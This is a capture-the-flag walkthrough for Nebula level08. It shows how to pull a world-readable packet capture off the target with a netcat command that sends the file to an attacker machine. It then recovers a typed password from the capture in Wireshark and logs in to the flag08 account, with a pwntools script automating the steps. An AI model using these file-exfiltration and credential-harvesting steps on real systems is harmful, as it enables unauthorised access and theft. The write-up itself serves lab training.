# Level08

#### Description

World readable files strike again. Check what that user was up to, and use it to log into **flag08** account.

To do this level, log in as the **level08** account with the password **level08**. Files for this level can be found in /home/flag08.

#### Solution

In flag08 account home directory, we have a packet captured file.

```bash
level08@nebula:/home/flag08$ ls -la
total 14
drwxr-x--- 2 flag08 level08   86 2012-08-19 03:07 .
drwxr-xr-x 1 root   root      80 2012-08-27 07:18 ..
-rw-r--r-- 1 flag08 flag08   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag08 flag08  3353 2011-05-18 02:54 .bashrc
-rw-r--r-- 1 root   root    8302 2011-11-20 21:22 capture.pcap
-rw-r--r-- 1 flag08 flag08   675 2011-05-18 02:54 .profile
```

We can get this file to our attacker kali machine using netcat.

{% code title="Target Machine" %}
```bash
level08@nebula:/home/flag08$ nc 192.168.117.128 9001 < capture.pcap
```
{% endcode %}

{% code title="Attacker kali machine" %}
```bash
┌──(ghost㉿kali)-[~/nebula/level08]
└─$ nc -lvnp 9001 > capture.pcap
listening on [any] 9001 ...
connect to [192.168.117.128] from (UNKNOWN) [192.168.117.140] 60503
                                                                                                                                                 
┌──(ghost㉿kali)-[~/nebula/level08]
└─$ file capture.pcap
capture.pcap: pcap capture file, microsecond ts (little-endian) - version 2.4 (Ethernet, capture length 65535)
```
{% endcode %}

Open it in wireshark and analyze it by following tcp stream.

<figure><img src="../../../.gitbook/assets/image (64).png" alt=""><figcaption></figcaption></figure>

We can see it captured a login credential for level8 user. But password is a little bit messed up here, so we can rearrange it.

<figure><img src="../../../.gitbook/assets/image (65).png" alt=""><figcaption></figcaption></figure>

Here's 7f represents to `.` We can look that into a hex table for what is the representation of 7f in hex.

<figure><img src="../../../.gitbook/assets/image (66).png" alt=""><figcaption></figcaption></figure>

&#x20;Ok, so 7f means DEL key was pressed. Now we can rearrange password into it's original form - `backd00Rmate`&#x20;

Now log into flag08 account.

```bash
level08@nebula:~$ su flag08
Password: 
sh-4.2$ id
uid=991(flag08) gid=991(flag08) groups=991(flag08)
sh-4.2$ getflag
You have successfully executed getflag on a target account
```

#### Python Automation

```python
from pwn import *
from sys import argv, exit

# Check if IP address is provided as an argument
if len(argv) < 2:
    sys.exit("IP address not found.")

# Establishes SSH connection with target IP address
session = ssh(host=argv[1], user='level08', password='level08')

capture_file = session.download_file(remote='/home/flag08/capture.pcap', local='/home/ghost/nebula/level08/capture.pcap')
print("Successfully downloaded capture file to /home/ghost/nebula/capture.pcap")
session.close()


sh = ssh(host=argv[1], user='flag08', password='backd00Rmate')
terminal = sh.shell()
terminal.sendline("getflag")
terminal.interactive()
```

<figure><img src="../../../.gitbook/assets/image (67).png" alt=""><figcaption></figcaption></figure>
